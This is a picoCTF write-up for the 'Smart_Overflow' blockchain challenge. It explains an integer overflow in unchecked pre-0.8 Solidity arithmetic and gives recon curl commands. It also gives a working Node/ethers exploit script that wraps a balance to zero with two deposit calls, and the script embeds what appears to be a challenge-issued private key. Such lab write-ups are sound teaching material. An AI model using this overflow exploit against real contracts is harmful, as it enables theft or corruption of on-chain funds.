---
title: "Smart_Overflow Writeup"
description: "picoCTF Smart Overflow writeup triggering a uint256 integer overflow in unchecked Solidity arithmetic to satisfy the flag reveal condition."
category: "picoCTF - Blockchain"
tags: ["picoctf", "blockchain"]
published: true
---
# Smart_Overflow Writeup

Flag: picoCTF{<redacted>}

Tools used
- `curl`
- `node`
- `npm install ethers@6`
- `ethers` (installed under `/tmp/node_modules`)
- `4byte.directory` for selector lookup

Endpoints
- Web app: `http://mysterious-sea.picoctf.net:59216/`
- RPC: `http://mysterious-sea.picoctf.net:57602`
- Contract: `0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9`
- Player address: `0x051d3aD8Cae52E640e7D66405f6Ee6558377d0fa`

Recon
```bash
curl -L http://mysterious-sea.picoctf.net:59216/
curl -s http://mysterious-sea.picoctf.net:59216/status
curl -s -X POST http://mysterious-sea.picoctf.net:57602 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9","data":"0x27e235e3000000000000000000000000051d3ad8cae52e640e7d66405f6ee6558377d0fa"},"latest"],"id":1}'
curl -L -s 'https://www.4byte.directory/api/v1/signatures/?hex_signature=0xb6b55f25'
curl -L -s 'https://www.4byte.directory/api/v1/signatures/?hex_signature=0x27e235e3'
```

Bug
- `deposit(uint256 amount)` increases the internal balance using unchecked pre-0.8 Solidity arithmetic.
- The challenge reveals the flag if a deposit causes `balances[msg.sender]` to become smaller than it was before.
- Because the function does not require any matching `msg.value`, the attack is purely arithmetic.

Exploit idea
- Start from `balances[player] == 0`.
- Call `deposit(1)` so the internal balance becomes `1`.
- Call `deposit(type(uint256).max)`, which computes `1 + (2^256 - 1) == 0` modulo `2^256`.
- The new balance is smaller than the old one, so the contract sets `revealed = true`.

Exploit script
```bash
cd /tmp
npm install ethers@6

node - <<'NODE'
const { ethers } = require('/tmp/node_modules/ethers');

const rpc = 'http://mysterious-sea.picoctf.net:57602';
const pk = '0x16841d4639affd5e6ea7a599911fc38d8aaffd7408a19567406eb5dc28d60b80';
const contract = '0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);
  const iface = new ethers.Interface([
    'function deposit(uint256 amount)',
    'function getFlag() view returns (string)'
  ]);

  let tx = await wallet.sendTransaction({
    to: contract,
    data: iface.encodeFunctionData('deposit', [1n])
  });
  await tx.wait();

  tx = await wallet.sendTransaction({
    to: contract,
    data: iface.encodeFunctionData('deposit', [ethers.MaxUint256])
  });
  await tx.wait();

  const flagData = await provider.call({
    to: contract,
    data: iface.encodeFunctionData('getFlag', [])
  });
  const [flag] = iface.decodeFunctionResult('getFlag', flagData);
  console.log(flag);
})();
NODE
```

Verification
```bash
curl -s http://mysterious-sea.picoctf.net:59216/status
```
